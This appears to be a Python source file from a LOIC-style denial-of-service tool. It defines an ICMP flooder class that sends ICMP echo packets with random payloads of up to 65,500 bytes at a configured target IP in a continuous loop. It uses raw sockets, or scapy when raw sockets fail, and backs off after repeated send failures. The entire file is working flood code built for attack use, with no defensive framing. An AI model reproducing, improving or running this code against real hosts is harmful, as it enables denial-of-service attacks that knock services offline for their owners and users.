from __future__ import annotations

import asyncio
import logging
import os
import socket
import struct
import threading
import time

from loic.flooders.base import AsyncFlooder
from loic.config import AttackConfig
from loic.functions import icmp_checksum, random_int
from loic.req_state import ReqState

logger = logging.getLogger(__name__)


class ICMPFlooder(AsyncFlooder):
    def __init__(self, config: AttackConfig):
        super().__init__()
        self.ip = config.target_ip
        self._delay = config.delay
        self.random_msg = config.random_msg
        self.pings_per_thread = config.socks_per_thread
        self.ipv6 = config.ipv6
        self._scapy_available: bool | None = None
        self._consecutive_failures: int = 0
        self._backoff_until: float = 0.0

    def _try_raw_socket(self):
        family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
        try:
            sock = socket.socket(family, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            return sock
        except (PermissionError, OSError):
            return None

    def _build_icmp_packet(self, payload: bytes) -> bytes:
        checksum = 0
        header = struct.pack("!BBHHH", 8, 0, checksum, 1, 1)
        checksum = icmp_checksum(header + payload)
        header = struct.pack("!BBHHH", 8, 0, checksum, 1, 1)
        return header + payload

    async def _run(self):
        sock = self._try_raw_socket()
        if sock is None:
            try:
                from scapy.all import IP, ICMP, send
                self._scapy_available = True
                await self._flood_scapy()
            except ImportError:
                self._scapy_available = False
                self.state = ReqState.FAILED
                self._is_flooding = False
                logger.error("ICMP requires root privileges or scapy. Install scapy: pip install scapy")
            return

        sock.settimeout(5.0)
        await self._flood_raw(sock)

    async def _flood_raw(self, sock: socket.socket):
        target = self.ip
        delay_sec = self._delay / 1000.0 if self._delay > 0 else 0

        loop = asyncio.get_event_loop()

        while self._is_flooding:
            if time.monotonic() < self._backoff_until:
                await asyncio.sleep(0.5)
                continue

            payload = b""
            if self.random_msg:
                size = random_int(0, 65500)
                payload = os.urandom(size)

            self.state = ReqState.CONNECTING
            packet = self._build_icmp_packet(payload)
            addr = (target, 0)

            for _ in range(self.pings_per_thread):
                if not self._is_flooding:
                    break
                try:
                    await loop.run_in_executor(None, sock.sendto, packet, addr)
                    self.requested += 1
                    self._consecutive_failures = 0
                except (PermissionError, OSError) as e:
                    self.failed += 1
                    self._consecutive_failures += 1
                    self._check_backoff()
                    logger.debug("ICMP send error: %s", e)
                self.state = ReqState.COMPLETED

            if self._is_flooding and delay_sec > 0:
                await asyncio.sleep(delay_sec)

            self.state = ReqState.IDLE

        sock.close()

    async def _flood_scapy(self):
        from scapy.all import IP, ICMP, send as scapy_send

        target = self.ip
        delay_sec = self._delay / 1000.0 if self._delay > 0 else 0

        loop = asyncio.get_event_loop()

        while self._is_flooding:
            if time.monotonic() < self._backoff_until:
                await asyncio.sleep(0.5)
                continue

            payload = b""
            if self.random_msg:
                size = random_int(0, 65500)
                payload = os.urandom(size)

            self.state = ReqState.CONNECTING

            for _ in range(self.pings_per_thread):
                if not self._is_flooding:
                    break
                try:
                    pkt = IP(dst=target, ttl=128) / ICMP() / payload
                    await loop.run_in_executor(None, lambda: scapy_send(pkt, verbose=False, timeout=0.01))
                    self.requested += 1
                    self._consecutive_failures = 0
                except Exception as e:
                    self.failed += 1
                    self._consecutive_failures += 1
                    self._check_backoff()
                self.state = ReqState.COMPLETED

            if self._is_flooding and delay_sec > 0:
                await asyncio.sleep(delay_sec)

            self.state = ReqState.IDLE

    def _check_backoff(self):
        if self._consecutive_failures >= 50:
            self._backoff_until = time.monotonic() + 5.0
            self._consecutive_failures = 0